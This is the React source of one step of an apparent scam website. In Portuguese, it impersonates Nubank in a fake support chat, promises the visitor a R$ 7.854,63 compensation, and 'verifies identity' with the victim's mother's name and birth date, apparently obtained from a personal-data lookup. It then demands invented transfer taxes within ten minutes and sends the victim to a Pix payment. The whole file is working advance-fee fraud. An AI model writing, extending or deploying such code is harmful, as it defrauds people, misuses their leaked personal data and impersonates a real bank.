import { useState, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Avatar } from '@/components/ui/avatar';
import { CheckCircle, Phone, Loader2, X } from 'lucide-react';
import { UserData } from '../BenefitFlow';
import { formatDisplayDate } from '@/services/hubApi';
import nubankRepresentative from '@/assets/nubank-representative.jpg';

interface StepSixProps {
  userData: UserData;
  onNext: () => void;
}

interface ChatMessage {
  id: number;
  type: 'bot' | 'user';
  content: string;
  delay: number;
  isVideo?: boolean;
  options?: string[];
  showPhone?: boolean;
  showAudio?: boolean;
  showFinalButton?: boolean;
  isTyping?: boolean;
}

export const StepSix = ({ userData, onNext }: StepSixProps) => {
  const [visibleMessages, setVisibleMessages] = useState<number[]>([]);
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  const [userResponses, setUserResponses] = useState<{[key: number]: string}>({});
  const [wrongAnswers, setWrongAnswers] = useState<{[key: number]: boolean}>({});
  const [showFinalStep, setShowFinalStep] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [showPaymentFlow, setShowPaymentFlow] = useState(false);
  const [showPaymentLoading, setShowPaymentLoading] = useState(false);

  // Format name in Hub API pattern (show first part, hide rest with asterisks)
  const formatNameForOptions = (name: string) => {
    if (!name) return '';
    const upperName = name.toUpperCase();
    const words = upperName.split(' ');
    
    if (words.length === 1) {
      // Single word: show first 6-8 characters, rest as asterisks
      const visiblePart = words[0].substring(0, Math.min(8, words[0].length));
      const hiddenLength = Math.max(0, words[0].length - visiblePart.length);
      return visiblePart + '*'.repeat(Math.max(15, hiddenLength));
    } else {
      // Multiple words: show first word and part of second, rest as asterisks
      const firstWord = words[0];
      const secondWord = words[1] || '';
      const visibleSecond = secondWord.substring(0, Math.min(7, secondWord.length));
      const visiblePart = firstWord + (visibleSecond ? ' ' + visibleSecond : '');
      return visiblePart + '*'.repeat(15);
    }
  };

  // Generate dynamic options for mother's name question
  const generateMotherNameOptions = () => {
    const correctAnswer = userData.motherName;
    const fakeNames = [
      'RAQUEL QUEIROZ SANTOS',
      'FERNANDA DE SOUZA RODRIGUES', 
      'ELIETE APARECIDA DA SILVA SOUZA',
      'MARIA DAS GRAÇAS SILVA'
    ];
    
    // Format all names including the correct one
    const formattedCorrect = formatNameForOptions(correctAnswer || '');
    const formattedFakes = fakeNames.map(name => formatNameForOptions(name));
    
    // Remove any fake option that might match the correct answer
    const filteredFakeOptions = formattedFakes.filter(option => 
      option !== formattedCorrect
    );
    
    // Take first 3 fake options and add the correct answer
    const options = [...filteredFakeOptions.slice(0, 3), formattedCorrect];
    
    // Shuffle the options
    return options.sort(() => Math.random() - 0.5);
  };

  // Generate dynamic options for birth date question
  const generateBirthDateOptions = () => {
    const correctAnswer = formatDisplayDate(userData.birthDate);
    const fakeOptions = [
      '17/05/1949',
      '30/09/1997', 
      '25/01/1960',
      '31/07/1956'
    ];
    
    // Remove any fake option that might match the correct answer
    const filteredFakeOptions = fakeOptions.filter(option => option !== correctAnswer);
    
    // Take first 3 fake options and add the correct answer
    const options = [...filteredFakeOptions.slice(0, 3), correctAnswer];
    
    // Shuffle the options
    return options.sort(() => Math.random() - 0.5);
  };

  const chatMessages: ChatMessage[] = [
    {
      id: 1,
      type: 'bot',
      content: `Seja muito bem vindo ao Setor de Atendimento responsável por São Paulo`,
      delay: 1000
    },
    {
      id: 2,
      type: 'bot',
      content: `O número do PROTOCOLO deste atendimento é: ${new Date().getFullYear()}${Math.floor(Math.random() * 1000000000000)}`,
      delay: 2000
    },
    {
      id: 3,
      type: 'bot',
      content: `Você está a um passo de aprovar e receber sua indenização no valor de R$ 7.854,63!`,
      delay: 3000
    },
    {
      id: 4,
      type: 'bot',
      content: `Clique no vídeo abaixo para darmos continuidade 👇`,
      delay: 4000,
      isVideo: true
    },
    {
      id: 5,
      type: 'bot',
      content: `Responda as perguntas a seguir para a aprovação da sua indenização.`,
      delay: 10000
    },
    {
      id: 6,
      type: 'bot',
      content: `Qual nome da sua mãe?`,
      delay: 6000,
      options: generateMotherNameOptions()
    },
    {
      id: 7,
      type: 'bot',
      content: `Qual sua data de nascimento?`,
      delay: 1000,
      options: generateBirthDateOptions()
    },
    {
      id: 8,
      type: 'bot',
      content: `Identidade Confirmada com sucesso!`,
      delay: 1000
    },
    {
      id: 9,
      type: 'bot',
      content: `Data e Hora da Consulta\n${new Date().toLocaleDateString('pt-BR')} ${new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}\n\nProtocolo\n${Math.floor(Math.random() * 10000000000)}\n\nVocê possui uma indenização a receber no valor de R$ 7.854,63.`,
      delay: 2000,
      showPhone: true
    },
    // New payment flow messages
    {
      id: 10,
      type: 'bot',
      content: `Seu comprovante foi salvo!\nVocê irá receber uma cópia em até 15 minutos.\n\nATENÇÃO: A Nubank já iniciou o repasse da sua indenização de R$ 7.854,63\n\nPara liberar o seu valor é necessário realizar o pagamento do Imposto de Transferência em até 10 minutos.\n\nClique abaixo para entender o motivo do pagamento desse imposto.`,
      delay: 3000,
      options: ['PORQUE TENHO QUE PAGAR ESSE IMPOSTO?']
    },
    {
      id: 11,
      type: 'bot',
      content: `IMPORTANTE: Escute o áudio abaixo com bastante atenção!\n\n💰 Impostos necessários para liberação:\n\n🏦 IPCT (Imposto sobre Circulação de Transferência 0,21%): R$ 16,49\n\n📋 IPTI (Imposto sobre Transferência Indenizatório 0,25%): R$ 19,64\n\n✅ IPRI (Imposto sobre Recebimento Indenizatório 0,25%): R$ 19,64\n\n💳 Valor total do Imposto: R$ 55,73\n(Apenas 0,71% do valor total a receber)`,
      delay: 3000,
      showAudio: true
    },
    {
      id: 12,
      type: 'bot',
      content: `Somente após você finalizar o pagamento do Imposto de Recebimento a Nubank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.`,
      delay: 3000,
      showFinalButton: true
    }
  ];

  useEffect(() => {
    console.log('Message effect triggered:', { currentMessageIndex, totalMessages: chatMessages.length });
    
    if (currentMessageIndex < chatMessages.length) {
      const currentMessage = chatMessages[currentMessageIndex];
      console.log('Processing message:', currentMessage);
      
      // Show typing animation first
      setIsTyping(true);
      
      const typingTimer = setTimeout(() => {
        setIsTyping(false);
        setVisibleMessages(prev => [...prev, currentMessage.id]);
        
        // Only advance to next message if current doesn't require user interaction
        if (!currentMessage.options && !currentMessage.showPhone && !currentMessage.showFinalButton && !currentMessage.showAudio) {
          setTimeout(() => {
            setCurrentMessageIndex(prev => prev + 1);
          }, 500);
        }
      }, currentMessage.delay);

      return () => clearTimeout(typingTimer);
    }
  }, [currentMessageIndex, chatMessages.length]);

  const handleOptionSelect = (messageId: number, option: string) => {
    console.log('Option selected:', { messageId, option, currentMessageIndex });
    
    // Validate answers for mother's name and birth date questions
    if (messageId === 6) { // Mother's name question
      const correctAnswer = formatNameForOptions(userData.motherName || '');
      if (option !== correctAnswer) {
        setWrongAnswers(prev => ({ ...prev, [messageId]: true }));
        return; // Don't proceed if wrong answer
      }
    } else if (messageId === 7) { // Birth date question  
      const correctAnswer = formatDisplayDate(userData.birthDate);
      if (option !== correctAnswer) {
        setWrongAnswers(prev => ({ ...prev, [messageId]: true }));
        return; // Don't proceed if wrong answer
      }
    }

    // Clear any previous wrong answer state for this question
    setWrongAnswers(prev => ({ ...prev, [messageId]: false }));
    setUserResponses(prev => ({ ...prev, [messageId]: option }));
    
    // Continue with next message after user response
    setTimeout(() => {
      if (messageId === 9) {
        // After phone confirmation, start payment flow
        setCurrentMessageIndex(9); // Move to message 10
      } else if (messageId === 10) {
        // After "PORQUE TENHO QUE PAGAR" button - advance to message 11
        console.log('Advancing to message 11 with audio');
        setCurrentMessageIndex(10); // Move to message 11 (index 10 = message 11)
      } else {
        setCurrentMessageIndex(prev => prev + 1);
      }
    }, 1000);
  };

  const handlePhoneConfirm = () => {
    setUserResponses(prev => ({ ...prev, 9: 'SIM, APROVAR INDENIZAÇÃO' }));
    setTimeout(() => {
      setCurrentMessageIndex(9); // Move to message 10
    }, 1000);
  };

  const handleFinalPayment = () => {
    setShowPaymentLoading(true);
    // Simulate loading for 3 seconds then redirect to checkout
    setTimeout(() => {
      onNext(); // This will redirect to checkout
    }, 3000);
  };

  const formatMessageContent = (content: string) => {
    return content.split('\n').map((line, index) => (
      <div key={index} className={index > 0 ? 'mt-2' : ''}>
        {line.includes('Protocolo') ? (
          <div className="font-bold text-lg">{line}</div>
        ) : line.includes('R$') ? (
          <div className="font-bold text-primary text-xl">{line}</div>
        ) : (
          line
        )}
      </div>
    ));
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-primary/5 via-background to-primary/10">
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        {/* Header */}
        <div className="flex items-center justify-between mb-6 p-4 bg-white rounded-lg shadow-sm border">
          <div className="flex items-center gap-3">
            <div className="w-3 h-3 bg-primary rounded-full"></div>
            <span className="text-muted-foreground">Benefício {'>'} Indenização {'>'} Atendimento</span>
          </div>
          <Button variant="ghost" size="sm" className="text-primary">
            <Phone className="w-4 h-4" />
          </Button>
        </div>

        {/* Chat Messages */}
        <div className="space-y-4">
          {chatMessages.map((message) => {
            if (!visibleMessages.includes(message.id)) return null;

            return (
              <div key={message.id} className="space-y-4">
                {/* Bot Message */}
                <div className="flex gap-3">
                  <Avatar className="w-10 h-10">
                    <img src={nubankRepresentative} alt="Nubank Representative" className="w-full h-full object-cover rounded-full" />
                  </Avatar>
                  <div className="flex-1">
                    <Card className="border-0 shadow-sm">
                      <CardContent className="p-3 sm:p-4">
                        <div className={`text-sm leading-relaxed ${
                          message.id === 10 || message.id === 12 
                            ? 'text-xs sm:text-sm' 
                            : ''
                        }`}>
                          {formatMessageContent(message.content)}
                        </div>

                        {/* Video Embed */}
                        {message.isVideo && (
                          <div className="mt-4">
                            <div style={{position:"relative", paddingTop:"133.33333333333331%"}}>
                              <iframe 
                                id="panda-18ea3541-653a-4070-a3c5-e680158ff266" 
                                src="https://player-vz-a5f41599-9ad.tv.pandavideo.com.br/embed/?v=18ea3541-653a-4070-a3c5-e680158ff266&playOpensFullscreenNative=true" 
                                style={{border:"none", position:"absolute", top:0, left:0}} 
                                allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" 
                              allowFullScreen={true}
                                width="100%" 
                                height="100%"
                              />
                            </div>
                            <script 
                              dangerouslySetInnerHTML={{
                                __html: `
                                  if(!document.querySelector('script[src="https://player.pandavideo.com.br/api.v2.js"]')){
                                    let s=document.createElement('script');
                                    s.src='https://player.pandavideo.com.br/api.v2.js'; 
                                    s.async=true; 
                                    document.head.appendChild(s);
                                  } 
                                  window.pandascripttag = window.pandascripttag || [];
                                  window.pandascripttag.push(function (){
                                    const panda_id_player = 'panda-18ea3541-653a-4070-a3c5-e680158ff266';
                                    const p=new PandaPlayer(panda_id_player,{
                                      onReady(){
                                        p.loadWindowScreen({panda_id_player});
                                      }
                                    });
                                  });
                                `
                              }}
                            />
                          </div>
                        )}

                        {/* Phone Number Display */}
                        {message.showPhone && !userResponses[message.id] && (
                          <div className="mt-4 space-y-3">
                            <Button 
                              className="w-full bg-primary hover:bg-primary/90 text-white"
                              onClick={handlePhoneConfirm}
                            >
                              SIM, APROVAR INDENIZAÇÃO
                            </Button>
                          </div>
                        )}

                        {/* Audio Player */}
                        {message.showAudio && (
                          <div className="mt-4">
                            <div className="bg-gray-100 rounded-lg p-3 mb-2">
                              <p className="text-sm text-gray-600 mb-2">🎧 Áudio explicativo sobre os impostos:</p>
                              <audio 
                                controls 
                                className="w-full"
                                preload="metadata"
                                onError={() => console.log('Audio failed to load')}
                                onLoadStart={() => console.log('Audio loading started')}
                                onCanPlay={() => console.log('Audio can play')}
                              >
                                <source src="https://upcdn.io/223k2Jt/audio/zoq2z6ci5j8r899exz5tz56g.mp3?f=mp3" type="audio/mpeg" />
                                <source src="https://upcdn.io/223k2Jt/raw/zoq2z6ci5j8r899exz5tz56g.mp3" type="audio/mpeg" />
                                Seu navegador não suporta áudio.
                              </audio>
                            </div>
                          </div>
                        )}

                        {/* Final Payment Button */}
                        {message.showFinalButton && !userResponses[message.id] && (
                          <div className="mt-4">
                            <Button 
                              className="w-full bg-primary hover:bg-primary/90 text-white h-12 font-semibold text-sm sm:text-base px-3 sm:px-6"
                              onClick={handleFinalPayment}
                            >
                              Concluir pagamento e receber minha indenização
                            </Button>
                          </div>
                        )}
                      </CardContent>
                    </Card>

                    {/* Response Options */}
                    {message.options && !userResponses[message.id] && (
                      <div className="mt-3 space-y-2">
                        <p className="text-sm text-muted-foreground ml-2">Escolha a alternativa correta.</p>
                        {message.options.map((option, index) => (
                          <Button
                            key={index}
                            variant="outline"
                            className="w-full justify-start bg-primary text-white border-primary hover:bg-primary/90"
                            onClick={() => handleOptionSelect(message.id, option)}
                          >
                            {option}
                          </Button>
                        ))}
                      </div>
                    )}

                    {/* User Response */}
                    {userResponses[message.id] && (
                      <div className="mt-3 flex justify-end">
                        <div className="bg-primary text-white p-3 rounded-lg max-w-xs">
                          {userResponses[message.id]}
                        </div>
                      </div>
                    )}

                    {/* Success Message */}
                    {userResponses[message.id] && message.options && (
                      <div className="mt-2 flex items-center gap-2 text-green-600">
                        <CheckCircle className="w-4 h-4" />
                        <span className="text-sm">Resposta Correta!</span>
                      </div>
                    )}

                    {/* Error Message for Wrong Answer */}
                    {wrongAnswers[message.id] && (
                      <div className="mt-2 flex items-center gap-2 text-red-600 bg-red-50 p-3 rounded-lg">
                        <X className="w-4 h-4" />
                        <span className="text-sm">
                          Resposta incorreta. Tente novamente com a informação correta.
                        </span>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            );
          })}

          {/* Typing Indicator */}
          {isTyping && (
            <div className="flex gap-3">
              <Avatar className="w-10 h-10">
                <img src={nubankRepresentative} alt="Nubank Representative" className="w-full h-full object-cover rounded-full" />
              </Avatar>
              <div className="flex-1">
                <Card className="border-0 shadow-sm">
                  <CardContent className="p-4">
                    <div className="flex items-center gap-2">
                      <div className="flex gap-1">
                        <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                        <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
                        <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
                      </div>
                      <span className="text-sm text-gray-500">Digitando...</span>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          )}

          {/* Payment Loading Screen */}
          {showPaymentLoading && (
            <div className="fixed inset-0 bg-primary z-50 flex flex-col items-center justify-center text-white">
              <div className="text-center space-y-8">
                <div className="text-3xl font-bold">Olá</div>
                
                <div className="w-32 h-32 mx-auto relative">
                  <div className="w-32 h-32 border-4 border-white/30 rounded-full"></div>
                  <div className="absolute inset-0 w-32 h-32 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                  <div className="absolute inset-4 flex items-center justify-center">
                    <span className="text-2xl font-bold">nu</span>
                  </div>
                </div>
                
                <div className="space-y-2">
                  <div className="text-xl font-semibold">Preparando seu pagamento</div>
                  <div className="text-sm opacity-80">Estamos gerando seu QR Code Pix...</div>
                </div>
                
                <div className="flex gap-2 justify-center">
                  <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
                  <div className="w-3 h-3 bg-white rounded-full animate-pulse" style={{animationDelay: '0.2s'}}></div>
                  <div className="w-3 h-3 bg-white rounded-full animate-pulse" style={{animationDelay: '0.4s'}}></div>
                </div>
              </div>
            </div>
          )}

          {/* Final Step */}
          {showFinalStep && (
            <div className="flex gap-3">
              <Avatar className="w-10 h-10">
                <img src={nubankRepresentative} alt="Nubank Representative" className="w-full h-full object-cover rounded-full" />
              </Avatar>
              <div className="flex-1">
                <Card className="border-0 shadow-sm">
                  <CardContent className="p-4">
                    <div className="text-center space-y-4">
                      <div className="text-lg font-semibold text-primary">
                        Confirmação de Autenticidade
                      </div>
                      
                      <div className="h-1 bg-primary/20 rounded-full">
                        <div className="h-1 bg-primary rounded-full w-full"></div>
                      </div>

                      <div className="bg-green-100 text-green-800 p-3 rounded-lg">
                        <div className="font-semibold">Dados Autenticados</div>
                        <div className="text-sm mt-1">
                          Os dados do(a) Sr(a). {userData.name} foram encontrados em nosso sistema e sua autenticidade foi confirmada.
                        </div>
                      </div>

                      <Button 
                        onClick={onNext}
                        className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary/70"
                      >
                        Continuar para Próxima Etapa
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};